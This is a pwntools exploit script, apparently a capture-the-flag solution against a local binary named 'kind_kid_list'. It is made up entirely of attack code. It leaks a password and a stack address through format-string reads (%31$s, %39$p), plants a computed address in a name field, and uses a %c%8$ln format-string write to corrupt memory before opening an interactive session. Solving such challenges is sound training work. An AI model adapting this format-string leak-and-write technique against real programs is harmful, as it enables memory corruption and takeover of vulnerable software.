#!/usr/bin/python3

from pwn import * 
context.binary = exe = ELF('./kind_kid_list',checksec=False)
p = process()
gdb.attach(p,gdbscript='''
           b*main+647
           b*main+691
            b*main+740
#           ''')
p.sendlineafter(b'>> ',b'2')
p.sendlineafter(b' : ',b'%31$s')
leak = p.recv(8).strip()
p.sendlineafter(b'>> ',b'2')
#input()
p.sendlineafter(b' : ',leak)
p.sendlineafter(b'Name : ',b'wyv3rn')

#input()
p.sendlineafter('>> ',b'%39$p')
p.recvuntil(b'Password : ')
dest = int(p.recvuntil(b'is')[:-3],16)
st = dest - 0x1d0 
print(hex(st))
print("address: ",hex(st))
p.sendlineafter(b'>> ',b'2')
p.sendlineafter(b'Password : ',leak)
p.sendlineafter(b'Name : ',p64(st))
input()
#for i in range(6):
 #   p.sendlineafter(b'>> ',b'2')
  #  p.sendlineafter(b'Password : ',leak)
   # p.sendlineafter(b'Name : ',p64(st))
p.sendlineafter(b'>> ',b'2')
p.sendlineafter(b'Password : ',b'%c%8$ln')

p.sendlineafter(b'>> ',b'3')

p.interactive()
